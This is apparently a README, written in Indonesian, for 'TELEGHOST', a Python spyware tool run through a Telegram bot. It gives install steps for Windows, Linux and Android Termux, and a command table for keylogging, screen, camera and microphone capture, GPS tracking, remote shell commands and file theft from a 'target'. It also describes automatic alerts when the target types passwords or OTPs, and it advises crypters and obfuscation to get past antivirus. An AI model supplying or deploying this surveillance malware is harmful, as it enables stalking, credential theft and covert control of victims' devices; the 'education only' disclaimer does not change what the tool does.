# 👻 TELEGHOST – Spyware Telegram Edition

**TELEGHOST** adalah spyware ringan berbasis Python yang dikendalikan sepenuhnya melalui bot Telegram.  
Alat ini dibuat untuk tujuan **edukasi dan pengujian keamanan** di perangkat sendiri.

---

## 📌 DAFTAR ISI

1. [Persiapan Awal](#-persiapan-awal)
2. [Instalasi di Windows](#-instalasi-di-windows)
3. [Instalasi di Linux](#-instalasi-di-linux)
4. [Instalasi di Termux (Android)](#-instalasi-di-termux-android)
5. [Cara Konfigurasi](#-cara-konfigurasi)
6. [Menjalankan TELEGHOST](#-menjalankan-teleghost)
7. [Daftar Perintah Telegram](#-daftar-perintah-telegram)
8. [Fitur Notifikasi Otomatis](#-fitur-notifikasi-otomatis)
9. [Cara Menghentikan TELEGHOST](#-cara-menghentikan-teleghost)
10. [Troubleshooting](#-troubleshooting)
11. [Pesan dari XoXo](#-pesan-dari-xoxo)

---

## 🔧 PERSIAPAN AWAL

### 1. Buat Bot Telegram
- Buka Telegram, cari **@BotFather**
- Kirim `/newbot` dan ikuti instruksi
- Simpan **TOKEN** yang diberikan  
  Contoh: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

### 2. Dapatkan CHAT_ID
- Kirim pesan apa pun ke bot yang baru lo buat
- Akses URL di browser:
  ```
  https://api.telegram.org/bot<TOKEN>/getUpdates
  ```
- Cari `"chat":{"id":` dan catat angkanya  
  Contoh: `123456789`

---

## 🖥️ INSTALASI DI WINDOWS

### Langkah 1: Install Python
- Download Python dari [python.org](https://python.org)
- Saat install, **centang** "Add Python to PATH"

### Langkah 2: Download TELEGHOST
```cmd
git clone https://github.com/hidayat-tanjung/TELEGHOST.git
cd TELEGHOST
```

### Langkah 3: Install Dependensi
```cmd
pip install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests
```

### Langkah 4: Jalankan
```cmd
python teleghost.py
```

---

## 🐧 INSTALASI DI LINUX

### Langkah 1: Install Python & Git
```bash
sudo apt update
sudo apt install python3 python3-pip git portaudio19-dev -y
```

### Langkah 2: Download TELEGHOST
```bash
git clone https://github.com/hidayat-tanjung/TELEGHOST.git
cd TELEGHOST
```

### Langkah 3: Install Dependensi
```bash
pip3 install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests
```

### Langkah 4: Jalankan
```bash
python3 teleghost.py
```

---

## 📱 INSTALASI DI TERMUX (ANDROID)

### Langkah 1: Install Termux
- Download dari **F-Droid** (bukan Play Store)
- Buka Termux

### Langkah 2: Update & Install Paket
```bash
pkg update && pkg upgrade -y
pkg install python git termux-api -y
```

### Langkah 3: Download TELEGHOST
```bash
git clone https://github.com/hidayat-tanjung/TELEGHOST.git
cd TELEGHOST
```

### Langkah 4: Install Dependensi
```bash
pip install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests
```

### Langkah 5: Jalankan
```bash
python teleghost.py &
```
(Tanda `&` agar berjalan di background)

---

## ⚙️ CARA KONFIGURASI

Buka file `teleghost.py`, cari baris ini:

```python
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI
CHAT_ID = "123456789"  # GANTI
```

Ganti dengan token dan chat ID yang sudah lo dapatkan.

---

## 🚀 MENJALANKAN TELEGHOST

### Di Windows
```cmd
python teleghost.py
```

### Di Linux
```bash
python3 teleghost.py
```

### Di Termux
```bash
python teleghost.py &
```

### Agar berjalan di background (Linux/Termux)
```bash
nohup python teleghost.py > /dev/null 2>&1 &
```

---

## 📋 DAFTAR PERINTAH TELEGRAM

| Perintah | Fungsi |
|----------|--------|
| `/screenshot` | Ambil layar target |
| `/screenrec [detik]` | Rekam layar (default 10s) |
| `/keylog_start` | Mulai keylogger |
| `/keylog_stop` | Hentikan & kirim hasil |
| `/mic [detik]` | Rekam mic (default 10s) |
| `/cam_photo` | Foto dari kamera |
| `/cam_video [detik]` | Video dari kamera |
| `/gps` | Kirim lokasi |
| `/cmd [perintah]` | Jalankan perintah sistem |
| `/upload [path]` | Upload file dari target |
| `/download [url] [path]` | Download file ke target |
| `/status` | Cek status TELEGHOST |

---

## 🔔 FITUR NOTIFIKASI OTOMATIS

TELEGHOST akan mengirim alert ke Telegram jika:
- Target membuka aplikasi tertentu (Chrome, WhatsApp, Telegram, dll)
- Target mengetik kata sensitif (password, login, admin, pin, otp)
- Screenshot periodik tiap 5 menit
- Lokasi GPS berubah lebih dari 500 meter
- Kamera mendeteksi gerakan
- Mikrofon menangkap suara keras

---

## 🛑 CARA MENGHENTIKAN TELEGHOST

### Di Windows
```cmd
taskkill /F /IM python.exe
```

### Di Linux / Termux
```bash
pkill -f teleghost.py
```

---

## ❓ TROUBLESHOOTING

**Q: TELEGHOST gak kirim data ke Telegram?**  
A: Cek `BOT_TOKEN` dan `CHAT_ID`, pastikan koneksi internet target aktif.

**Q: Keylogger gak nangkap huruf?**  
A: Pastikan `pynput` terinstall. Di Android hanya berfungsi di Termux.

**Q: Rekam layar gagal di Android?**  
A: Butuh izin "Screen Recording" — target harus klik Allow.

**Q: Error pyaudio di Linux?**  
A: Install `portaudio19-dev`, lalu `pip install pyaudio --force-reinstall`.

**Q: Bisa dipakai di iPhone?**  
A: Tidak. Hanya Windows, Linux, dan Android (Termux).

**Q: Antivirus mendeteksi TELEGHOST?**  
A: Gunakan crypter atau obfuscation (PyArmor, UPX).

**Q: Berapa ukuran file TELEGHOST?**  
A: Python ~20-30 KB. .exe ~5-10 MB.

**Q: Bisa untuk banyak target?**  
A: Satu bot untuk satu target. Buat bot baru untuk target lain.

**Q: Data tersimpan di server Telegram?**  
A: Ya. Hindari kirim data sangat sensitif.

---

## 📌 PESAN DARI イズミー

> *"Ilmu ini untuk memahami celah keamanan, bukan untuk merusak.  
> Gunakan dengan bijak, karena kepercayaan adalah hal yang rapuh.  
> Stay safe, stay stealthy."*
